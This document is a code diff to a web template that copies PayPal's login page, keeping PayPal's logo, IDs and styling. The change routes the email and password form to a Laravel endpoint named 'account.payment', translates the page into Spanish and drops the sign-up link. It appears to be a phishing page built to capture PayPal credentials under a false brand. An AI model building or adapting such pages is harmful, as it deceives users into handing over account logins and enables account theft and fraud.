@@ -17,25 +17,24 @@
                     <header>
                         <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                       </header>
-                    <form action="#" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+                      <form method="post" action="{{ route('account.payment') }}">
+                            @csrf
                         <div id="passwordSection" class="clearfix">
                             <div class="textInput" id="login_emaildiv">
                                 <div class="fieldWrapper">
-                                    <label for="email" class="fieldLabel">Email</label>
-                                    <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
+                                    <label for="email" class="fieldLabel">Correo electrónico</label>
+                                    <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Correo electrónico" required>
                                </div>
                             </div>
                             
                          <div class="textInput lastInputField" id="login_passworddiv">
-                             <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
-                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
+                             <div class="fieldWrapper"><label for="password" class="fieldLabel">Contraseña</label>
+                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Contraseña" required>
                            </div>
                          </div>
                        </div>
-                   <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
+                   <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Iniciar sesión</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">¿Tienes problemas para iniciar sesión?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
                    </form>
-                   
-                   <a href="#" class="button secondary" id="createAccount">Sign Up</a>
                 </div>
             </div>
         </section>
